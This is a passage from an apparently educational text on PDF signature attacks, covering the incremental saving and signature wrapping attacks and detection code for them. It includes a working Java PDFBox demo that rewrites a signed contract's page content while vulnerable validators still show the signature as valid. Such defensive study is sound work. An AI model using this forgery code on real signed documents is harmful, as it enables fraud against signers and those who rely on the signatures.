 \CommentTok{*}\NormalTok{ An ISA}\CommentTok{{-}}\NormalTok{vulnerable validator shows }\CommentTok{"}\NormalTok{Signature is valid}\CommentTok{"}\NormalTok{ on the modified content}\CommentTok{.}
 \CommentTok{*/}
\KeywordTok{public} \KeywordTok{class}\NormalTok{ IsaAttackDemo }\OperatorTok{\{}

    \KeywordTok{public} \DataTypeTok{static} \DataTypeTok{void} \FunctionTok{main}\OperatorTok{(}\BuiltInTok{String}\OperatorTok{[]}\NormalTok{ args}\OperatorTok{)} \KeywordTok{throws} \BuiltInTok{Exception} \OperatorTok{\{}
        \DataTypeTok{byte}\OperatorTok{[]}\NormalTok{ signedPdf }\OperatorTok{=}\NormalTok{ Files}\OperatorTok{.}\FunctionTok{readAllBytes}\OperatorTok{(}
                \KeywordTok{new} \BuiltInTok{File}\OperatorTok{(}\StringTok{"signed{-}document.pdf"}\OperatorTok{).}\FunctionTok{toPath}\OperatorTok{());}

        \CommentTok{// Load for incremental save — preserves the original bytes}
\NormalTok{        PDDocument doc }\OperatorTok{=}\NormalTok{ Loader}\OperatorTok{.}\FunctionTok{loadPDF}\OperatorTok{(}\NormalTok{signedPdf}\OperatorTok{);}

        \CommentTok{// Get the first page and replace its content}
\NormalTok{        PDPage page }\OperatorTok{=}\NormalTok{ doc}\OperatorTok{.}\FunctionTok{getPage}\OperatorTok{(}\DecValTok{0}\OperatorTok{);}

        \CommentTok{// Create a new content stream that overwrites existing content}
\NormalTok{        PDPageContentStream cs }\OperatorTok{=} \KeywordTok{new} \FunctionTok{PDPageContentStream}\OperatorTok{(}
\NormalTok{                doc}\OperatorTok{,}\NormalTok{ page}\OperatorTok{,}
\NormalTok{                PDPageContentStream}\OperatorTok{.}\FunctionTok{AppendMode}\OperatorTok{.}\FunctionTok{OVERWRITE}\OperatorTok{,}
                \KeywordTok{true}\OperatorTok{);} 

\NormalTok{        cs}\OperatorTok{.}\FunctionTok{beginText}\OperatorTok{();}
\NormalTok{        cs}\OperatorTok{.}\FunctionTok{setFont}\OperatorTok{(}
                \KeywordTok{new} \FunctionTok{PDType1Font}\OperatorTok{(}\NormalTok{Standard14Fonts}\OperatorTok{.}\FunctionTok{FontName}\OperatorTok{.}\FunctionTok{HELVETICA\_BOLD}\OperatorTok{),} \DecValTok{36}\OperatorTok{);}
\NormalTok{        cs}\OperatorTok{.}\FunctionTok{newLineAtOffset}\OperatorTok{(}\DecValTok{50}\OperatorTok{,} \DecValTok{700}\OperatorTok{);}
\NormalTok{        cs}\OperatorTok{.}\FunctionTok{showText}\OperatorTok{(}\StringTok{"CONTRACT VOIDED"}\OperatorTok{);} 
\NormalTok{        cs}\OperatorTok{.}\FunctionTok{endText}\OperatorTok{();}
\NormalTok{        cs}\OperatorTok{.}\FunctionTok{close}\OperatorTok{();}

        \CommentTok{// Save incrementally — appends new objects + xref + trailer}
        \CommentTok{// The original signature\textquotesingle{}s byte range is UNTOUCHED}
        \BuiltInTok{ByteArrayOutputStream}\NormalTok{ baos }\OperatorTok{=} \KeywordTok{new} \BuiltInTok{ByteArrayOutputStream}\OperatorTok{();}
\NormalTok{        doc}\OperatorTok{.}\FunctionTok{saveIncremental}\OperatorTok{(}\NormalTok{baos}\OperatorTok{);} 
\NormalTok{        doc}\OperatorTok{.}\FunctionTok{close}\OperatorTok{();}

\NormalTok{        Files}\OperatorTok{.}\FunctionTok{write}\OperatorTok{(}
                \KeywordTok{new} \BuiltInTok{File}\OperatorTok{(}\StringTok{"isa{-}attack{-}result.pdf"}\OperatorTok{).}\FunctionTok{toPath}\OperatorTok{(),}\NormalTok{ baos}\OperatorTok{.}\FunctionTok{toByteArray}\OperatorTok{());}

        \CommentTok{// The file now looks like this:}
        \CommentTok{// [original PDF bytes ... signature ... \%\%EOF]  \textless{}{-}{-} signed revision}
        \CommentTok{// [new objects ... new xref ... new trailer ... \%\%EOF]  \textless{}{-}{-} attacker\textquotesingle{}s appendage}
        \CommentTok{//}
        \CommentTok{// The signature covers only the first section.}
        \CommentTok{// The viewer renders the second section.}
        \CommentTok{// A correct validator: warns "Document modified after signing"}
        \CommentTok{// An ISA{-}vulnerable validator: shows green checkmark}
    \OperatorTok{\}}
\OperatorTok{\}}
\end{Highlighting}
\end{Shaded}

\begin{itemize}
\item
  \texttt{AppendMode.OVERWRITE} replaces the existing content stream.
  PDFBox tracks this as a modified object, which will be written in the
  incremental update
\item
  The attacker-controlled content --- can be anything
\item
  \texttt{saveIncremental()} appends to the existing file bytes without
  modifying them. The original signature's \texttt{/ByteRange} and
  \texttt{/Contents} remain at their original byte positions. The new
  revision simply adds new objects and a new cross-reference section
  after the original \texttt{\%\%EOF}
\end{itemize}

\subsubsection{Detecting ISA: Revision
Comparison}\label{_detecting_isa_revision_comparison}

The defense against ISA requires comparing the document as rendered from
the signed revision to the document as rendered from the current
(potentially modified) revision.

\begin{Shaded}
\begin{Highlighting}[]
\KeywordTok{import} \ImportTok{org}\OperatorTok{.}\ImportTok{apache}\OperatorTok{.}\ImportTok{pdfbox}\OperatorTok{.}\ImportTok{Loader}\OperatorTok{;}
\KeywordTok{import} \ImportTok{org}\OperatorTok{.}\ImportTok{apache}\OperatorTok{.}\ImportTok{pdfbox}\OperatorTok{.}\ImportTok{pdmodel}\OperatorTok{.}\ImportTok{PDDocument}\OperatorTok{;}
\KeywordTok{import} \ImportTok{org}\OperatorTok{.}\ImportTok{apache}\OperatorTok{.}\ImportTok{pdfbox}\OperatorTok{.}\ImportTok{pdmodel}\OperatorTok{.}\ImportTok{interactive}\OperatorTok{.}\ImportTok{digitalsignature}\OperatorTok{.}\ImportTok{PDSignature}\OperatorTok{;}

\KeywordTok{import} \ImportTok{java}\OperatorTok{.}\ImportTok{io}\OperatorTok{.}\ImportTok{ByteArrayInputStream}\OperatorTok{;}
\KeywordTok{import} \ImportTok{java}\OperatorTok{.}\ImportTok{util}\OperatorTok{.}\ImportTok{Arrays}\OperatorTok{;}

\CommentTok{/**}
 \CommentTok{*}\NormalTok{ Demonstrates how to extract the signed revision of a PDF and compare it}
 \CommentTok{*}\NormalTok{ to the full file }\CommentTok{—}\NormalTok{ the core defense against ISA}\CommentTok{.}
 \CommentTok{*/}
\KeywordTok{public} \KeywordTok{class}\NormalTok{ IsaDefenseCheck }\OperatorTok{\{}

    \KeywordTok{public} \DataTypeTok{static} \DataTypeTok{void} \FunctionTok{checkForAppendedContent}\OperatorTok{(}\DataTypeTok{byte}\OperatorTok{[]}\NormalTok{ pdfBytes}\OperatorTok{)}
            \KeywordTok{throws} \BuiltInTok{Exception} \OperatorTok{\{}

\NormalTok{        PDDocument doc }\OperatorTok{=}\NormalTok{ Loader}\OperatorTok{.}\FunctionTok{loadPDF}\OperatorTok{(}\NormalTok{pdfBytes}\OperatorTok{);}

        \ControlFlowTok{for} \OperatorTok{(}\NormalTok{PDSignature sig }\OperatorTok{:}\NormalTok{ doc}\OperatorTok{.}\FunctionTok{getSignatureDictionaries}\OperatorTok{())} \OperatorTok{\{}
            \DataTypeTok{int}\OperatorTok{[]}\NormalTok{ byteRange }\OperatorTok{=}\NormalTok{ sig}\OperatorTok{.}\FunctionTok{getByteRange}\OperatorTok{();} 

            \ControlFlowTok{if} \OperatorTok{(}\NormalTok{byteRange }\OperatorTok{==} \KeywordTok{null} \OperatorTok{||}\NormalTok{ byteRange}\OperatorTok{.}\FunctionTok{length} \OperatorTok{!=} \DecValTok{4}\OperatorTok{)} \OperatorTok{\{}
                \BuiltInTok{System}\OperatorTok{.}\FunctionTok{err}\OperatorTok{.}\FunctionTok{println}\OperatorTok{(}\StringTok{"FAIL: Invalid or missing /ByteRange"}\OperatorTok{);}
                \ControlFlowTok{continue}\OperatorTok{;}
            \OperatorTok{\}}

            \CommentTok{// The signed region ends at byteRange[2] + byteRange[3]}
            \DataTypeTok{int}\NormalTok{ signedEnd }\OperatorTok{=}\NormalTok{ byteRange}\OperatorTok{[}\DecValTok{2}\OperatorTok{]} \OperatorTok{+}\NormalTok{ byteRange}\OperatorTok{[}\DecValTok{3}\OperatorTok{];} 

            \CommentTok{// Check: does the file extend beyond the signed region?}
            \ControlFlowTok{if} \OperatorTok{(}\NormalTok{pdfBytes}\OperatorTok{.}\FunctionTok{length} \OperatorTok{\textgreater{}}\NormalTok{ signedEnd}\OperatorTok{)} \OperatorTok{\{}
                \DataTypeTok{int}\NormalTok{ extraBytes }\OperatorTok{=}\NormalTok{ pdfBytes}\OperatorTok{.}\FunctionTok{length} \OperatorTok{{-}}\NormalTok{ signedEnd}\OperatorTok{;}
                \BuiltInTok{System}\OperatorTok{.}\FunctionTok{err}\OperatorTok{.}\FunctionTok{println}\OperatorTok{(}
                        \StringTok{"WARNING: File contains "} \OperatorTok{+}\NormalTok{ extraBytes}
                        \OperatorTok{+} \StringTok{" bytes AFTER the signed byte range"}\OperatorTok{);} 
                \BuiltInTok{System}\OperatorTok{.}\FunctionTok{err}\OperatorTok{.}\FunctionTok{println}\OperatorTok{(}
                        \StringTok{"This indicates an incremental update after signing."}\OperatorTok{);}
                \BuiltInTok{System}\OperatorTok{.}\FunctionTok{err}\OperatorTok{.}\FunctionTok{println}\OperatorTok{(}
                        \StringTok{"These bytes are NOT covered by the signature."}\OperatorTok{);}
                \BuiltInTok{System}\OperatorTok{.}\FunctionTok{err}\OperatorTok{.}\FunctionTok{println}\OperatorTok{(}
                        \StringTok{"Investigate whether the changes are permissible "}
                        \OperatorTok{+} \StringTok{"(e.g., additional signatures, form fills) "}
                        \OperatorTok{+} \StringTok{"or malicious (content replacement)."}\OperatorTok{);}

                \CommentTok{// Extract the signed revision for comparison}
                \DataTypeTok{byte}\OperatorTok{[]}\NormalTok{ signedRevision }\OperatorTok{=} \BuiltInTok{Arrays}\OperatorTok{.}\FunctionTok{copyOfRange}\OperatorTok{(}
\NormalTok{                        pdfBytes}\OperatorTok{,} \DecValTok{0}\OperatorTok{,}\NormalTok{ signedEnd}\OperatorTok{);} 

                \CommentTok{// You can now load signedRevision as a separate PDDocument}
                \CommentTok{// and compare its rendered pages to the full document}
                \CommentTok{// to determine exactly what changed}
            \OperatorTok{\}} \ControlFlowTok{else} \ControlFlowTok{if} \OperatorTok{(}\NormalTok{pdfBytes}\OperatorTok{.}\FunctionTok{length} \OperatorTok{==}\NormalTok{ signedEnd}\OperatorTok{)} \OperatorTok{\{}
                \BuiltInTok{System}\OperatorTok{.}\FunctionTok{out}\OperatorTok{.}\FunctionTok{println}\OperatorTok{(}
                        \StringTok{"PASS: File ends exactly at the signed byte range. "}
                        \OperatorTok{+} \StringTok{"No incremental updates after signing."}\OperatorTok{);}
            \OperatorTok{\}} \ControlFlowTok{else} \OperatorTok{\{}
                \BuiltInTok{System}\OperatorTok{.}\FunctionTok{err}\OperatorTok{.}\FunctionTok{println}\OperatorTok{(}
                        \StringTok{"FAIL: File is SHORTER than the signed byte range. "}
                        \OperatorTok{+} \StringTok{"File is truncated or corrupted."}\OperatorTok{);}
            \OperatorTok{\}}
        \OperatorTok{\}}

\NormalTok{        doc}\OperatorTok{.}\FunctionTok{close}\OperatorTok{();}
    \OperatorTok{\}}
\OperatorTok{\}}
\end{Highlighting}
\end{Shaded}

\begin{itemize}
\item
  \texttt{/ByteRange} is an array of four integers:
  \texttt{{[}offset1,\ length1,\ offset2,\ length2{]}}. The two ranges
  cover everything before and after the \texttt{/Contents} gap
\item
  The signed content ends at the start of range 2 plus its length ---
  this is the last byte the signature covers
\item
  If the file extends beyond this point, there is appended content that
  the signature does not cover. This is the ISA detection point
\item
  Extracting the signed revision as a standalone PDF allows you to
  render it separately and compare to the current document state
\end{itemize}

A naive "does the file extend beyond the byte range?" check catches
obvious ISA attacks, but it is not sufficient. A legitimate second
signature also extends the file. The real check requires parsing the
appended incremental update and determining \emph{what} changed --- was
it another signature (allowed), a form fill (allowed under DocMDP P=3),
or a content modification (never allowed)? This is the hard part of ISA
defense, and it is where most viewers failed in 2019.

\subsection{Attack Class 3: Signature Wrapping Attack
(SWA)}\label{_attack_class_3_signature_wrapping_attack_swa}

\subsubsection{The Concept}\label{_the_concept_3}

The Signature Wrapping Attack is the most technically sophisticated of
the three original attack classes. Where USF exploits missing
cryptographic verification and ISA exploits missing modification
detection, SWA exploits the way viewers \emph{locate} the signature
within the file.

The core insight: the \texttt{/ByteRange} array tells the viewer which
bytes are signed, but \emph{nothing prevents an attacker from moving the
signed bytes to a different location in the file} --- as long as the
byte values at the \texttt{/ByteRange} offsets still produce the same
hash.

Actually, SWA is even simpler than that. The attacker doesn't need the
same hash. The attacker modifies the \texttt{/ByteRange} array itself to
point to a \emph{different} region of the file --- one that contains
attacker-controlled content --- while keeping the original CMS signature
that was computed over the original content.

Wait --- if the \texttt{/ByteRange} is modified, wouldn't the signature
be invalid? Yes, \emph{if the viewer reads the \texttt{/ByteRange} from
the signed revision}. But many viewers read the \texttt{/ByteRange} from
the \emph{current} cross-reference table, which may have been modified
by an incremental update. The attacker appends a new revision that:

\begin{enumerate}
\def\labelenumi{\arabic{enumi}.}
\item
  Redefines the signature dictionary object to point to a new
  \texttt{/ByteRange}
\item
  Places attacker-controlled content at the byte positions specified by
  the new \texttt{/ByteRange}
\item
  Ensures the CMS signature (in the original \texttt{/Contents}) is
  structurally present
\end{enumerate}

The viewer follows the new cross-reference to the redefined signature
dictionary, reads the attacker's \texttt{/ByteRange}, hashes the
attacker's content, and --- if it doesn't actually verify the hash
against the CMS signature (shades of USF) --- displays "valid."

In some variants, the viewer \emph{does} check the hash, but the
attacker has been clever about which bytes are at the new
\texttt{/ByteRange} positions, potentially including a copy of the
original signed content or exploiting hash-algorithm weaknesses.

\subsubsection{How It Works}\label{_how_it_works_3}

\begin{verbatim}
Original file layout:
  [header ... objects ... page content ... ]
  [signature dict: /ByteRange [0 840 3000 1200] /Contents <CMS...>]
  [xref ... trailer ... %%EOF]

  Bytes 0-839 and 3000-4199 are signed.
  Bytes 840-2999 are the /Contents gap (CMS signature value).
  The CMS signature is valid over hash(bytes[0..839] + bytes[3000..4199]).

Attacker appends an incremental update:
  [... %%EOF]                              <-- original file ends here
  [new object: modified signature dict     <-- attacker redefines the sig dict
      /ByteRange [0 840 5000 1200]         <-- points to NEW byte positions
      /Contents <original CMS bytes>]      <-- keeps the original CMS value
  [attacker content at byte offset 5000]   <-- whatever the attacker wants
  [new xref pointing to new sig dict]
  [new trailer ... %%EOF]
\end{verbatim}

The viewer follows the new xref, finds the redefined signature
dictionary, reads \texttt{/ByteRange\ {[}0\ 840\ 5000\ 1200{]}}, and
hashes bytes at those positions. If it checks the CMS signature against
this hash, it will fail (because the CMS signed the \emph{original} byte
range content). But if the viewer is also vulnerable to USF (skips the
hash verification), the attack succeeds.

SWA is often combined with elements of ISA and USF. The Bochum team
found that many real-world exploits used a combination of attack
techniques.

\subsubsection{Demonstration: Detecting
SWA}\label{_demonstration_detecting_swa}

\begin{Shaded}
\begin{Highlighting}[]
\KeywordTok{import} \ImportTok{org}\OperatorTok{.}\ImportTok{apache}\OperatorTok{.}\ImportTok{pdfbox}\OperatorTok{.}\ImportTok{Loader}\OperatorTok{;}
\KeywordTok{import} \ImportTok{org}\OperatorTok{.}\ImportTok{apache}\OperatorTok{.}\ImportTok{pdfbox}\OperatorTok{.}\ImportTok{pdmodel}\OperatorTok{.}\ImportTok{PDDocument}\OperatorTok{;}
